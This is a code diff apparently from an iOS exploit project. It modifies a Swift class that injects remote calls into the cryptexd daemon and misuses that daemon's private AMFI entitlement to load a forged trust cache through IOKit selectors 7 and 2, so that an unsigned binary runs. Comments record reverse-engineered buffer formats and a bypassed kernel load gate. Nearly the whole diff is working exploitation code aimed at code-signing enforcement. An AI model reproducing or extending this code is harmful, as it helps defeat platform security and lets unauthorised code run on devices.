@@ -14,10 +14,10 @@
 //    3. Selector 2: trust cache only (NO manifest needed!)
 //
 //  cryptexd has this entitlement and already uses this exact path.
-//  Buffer format for selector 7 (from cryptexd RE):
-//    [uint64_t tc_size][uint64_t manifest_size][tc_data][manifest_data]
+//  Buffer format for selector 7 (from cryptexd Ghidra RE):
+//    [uint64_t manifest_size][uint64_t tc_size][manifest_data][tc_data]
 //
-//  For selector 2: just raw trust cache data directly.
+//  For selector 2: raw trust cache data directly.
 //
 //  The trust cache load gate (DAT_fffffff007b795e8) is bypassed on
 //  UNLOCKED devices via FUN_fffffff008f78cc4 (AKS lock state check).
@@ -47,12 +47,22 @@ final class ExpCryptexdTCLoad {
         log("  cryptexd Trust Cache Load")
         log("══════════════════════════════════════")
         log("")
-        log("Strategy: RC → cryptexd → IOKit sel 2 → kernel TC load")
+        log("Strategy: safe unrestrict → RC → cryptexd → IOKit sel 7/2")
         log("cryptexd has: com.apple.private.amfi.can-load-trust-cache")
         log("")
         
+        // Step 0: Safe prep (developer_mode_resolved + exc_guard + flag diff)
+        log("[0/6] Safe cryptexd prep (no panic writes)...")
+        let prep = TaskExceptionUnrestrict.prepareCryptexd { [weak self] msg in
+            self?.log("   \(msg)")
+        }
+        if !prep.developerModeResolved {
+            log("⚠️ developer_mode_resolved not set — continuing anyway")
+        }
+        log("")
+        
         // Step 1: Build trust cache + test binary
-        log("[1/5] Building TC + binary...")
+        log("[1/6] Building TC + binary...")
         let testBin = buildBinary()
         let cdhash = sha256t20(testBin)
         let tcData = buildTrustCacheV2(cdhash: cdhash)
@@ -61,7 +71,7 @@ final class ExpCryptexdTCLoad {
         
         // Step 2: Write files
         log("")
-        log("[2/5] Writing files...")
+        log("[2/6] Writing files...")
         let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
         let binPath = docs + "/cryptexd_test"
         let tcPath = docs + "/cryptexd_tc.bin"
@@ -76,11 +86,15 @@ final class ExpCryptexdTCLoad {
         
         // Step 3: Wake cryptexd via XPC
         log("")
-        log("[3/5] Waking cryptexd...")
-        wakeCryptexd()
+        if !prep.processFound {
+            log("[3/6] Waking cryptexd...")
+            wakeCryptexd()
+        } else {
+            log("[3/6] cryptexd ready from prep ✅")
+        }
         
-        // Step 4: Connect RC to cryptexd (after 2s wake delay)
-        DispatchQueue.main.asyncAfter(deadline: .now() + 2.5) { [weak self] in
+        // Step 4: Connect RC to cryptexd (after wake delay)
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
             self?.connectCryptexd(tcData: tcData, binPath: binPath)
         }
         
@@ -147,7 +161,7 @@ final class ExpCryptexdTCLoad {
     
     private func connectCryptexd(tcData: Data, binPath: String) {
         log("")
-        log("[4/5] Connecting RC to cryptexd...")
+        log("[4/6] Connecting RC to cryptexd...")
         
         dspmgr.shared.rcinitDaemon(
             serviceName: "com.apple.cryptexd",
@@ -176,7 +190,7 @@ final class ExpCryptexdTCLoad {
     
     private func loadTCviaIOKit(rc: RemoteCall, tcData: Data, binPath: String) {
         log("")
-        log("[5/5] Loading trust cache via IOKit...")
+        log("[5/6] Loading trust cache via IOKit...")
         
         let RTLD_DEFAULT = UInt64(bitPattern: -2)
         
@@ -241,17 +255,37 @@ final class ExpCryptexdTCLoad {
         log("✅ AMFI IOKit connection opened!")
         log("")
         
-        // Write trust cache data to remote memory
+        let outBuf = rc.trojanMem + 0x4800
+        let outSizeAddr = rc.trojanMem + 0x4900
+        rc[outSizeAddr].setValue64(256)
+        
+        // Try SELECTOR 7 first (cryptexd amfi_load_trust_cache — Ghidra RE)
+        // Buffer: [uint64 manifest_size][uint64 tc_size][manifest_data][tc_data]
+        log("Trying selector 7 (cryptexd format)...")
+        let sel7Buf = rc.trojanMem + 0x5000
+        rc[sel7Buf].setValue64(0)
+        rc[sel7Buf + 8].setValue64(UInt64(tcData.count))
+        tcData.withUnsafeBytes { buf in
+            rc.remote_write(sel7Buf + 16, from: buf.baseAddress!, size: UInt64(tcData.count))
+        }
+        let sel7Total = UInt64(16 + tcData.count)
+        let sel7Result = RootExecutor.rcall(rc, "IOConnectCallStructMethod",
+            UInt64(conn), 7, sel7Buf, sel7Total, outBuf, outSizeAddr)
+        log("Selector 7 → 0x\(String(sel7Result, radix: 16))")
+        
+        if sel7Result == 0 {
+            log("✅✅✅ TRUST CACHE LOADED (selector 7)!")
+            testSpawn(binPath: binPath)
+            return
+        }
+        
+        // Write trust cache data for selector 2 fallback
         let tcBuf = rc.trojanMem + 0x3000
         tcData.withUnsafeBytes { buf in
             rc.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
         }
         
-        // Try SELECTOR 2 first (trust cache only, no manifest)
-        // IOConnectCallStructMethod(conn, selector, input, inputSize, output, outputSizePtr)
         log("Trying selector 2 (TC only, no manifest)...")
-        let outBuf = rc.trojanMem + 0x4800
-        let outSizeAddr = rc.trojanMem + 0x4900
         rc[outSizeAddr].setValue64(256)
         let sel2Result = RootExecutor.rcall(rc, "IOConnectCallStructMethod",
             UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSizeAddr)
@@ -259,31 +293,6 @@ final class ExpCryptexdTCLoad {
         
         if sel2Result == 0 {
             log("✅✅✅ TRUST CACHE LOADED (selector 2)!")
-            testSpawn(binPath: binPath)
-            return
-        }
-        
-        // Try SELECTOR 7 (trust cache + manifest format from cryptexd RE)
-        // Buffer: [uint64 tc_size][uint64 manifest_size=0][tc_data]
-        log("")
-        log("Trying selector 7 (cryptexd format)...")
-        let sel7Buf = rc.trojanMem + 0x5000
-        // Header: tc_size (8 bytes) + manifest_size=0 (8 bytes)
-        rc[sel7Buf].setValue64(UInt64(tcData.count))
-        rc[sel7Buf + 8].setValue64(0) // no manifest
-        // Copy TC data after header
-        tcData.withUnsafeBytes { buf in
-            rc.remote_write(sel7Buf + 16, from: buf.baseAddress!, size: UInt64(tcData.count))
-        }
-        let totalSize = UInt64(16 + tcData.count)
-        
-        rc[outSizeAddr].setValue64(256)
-        let sel7Result = RootExecutor.rcall(rc, "IOConnectCallStructMethod",
-            UInt64(conn), 7, sel7Buf, totalSize, outBuf, outSizeAddr)
-        log("Selector 7 → 0x\(String(sel7Result, radix: 16))")
-        
-        if sel7Result == 0 {
-            log("✅✅✅ TRUST CACHE LOADED (selector 7)!")
             testSpawn(binPath: binPath)
             return
         }
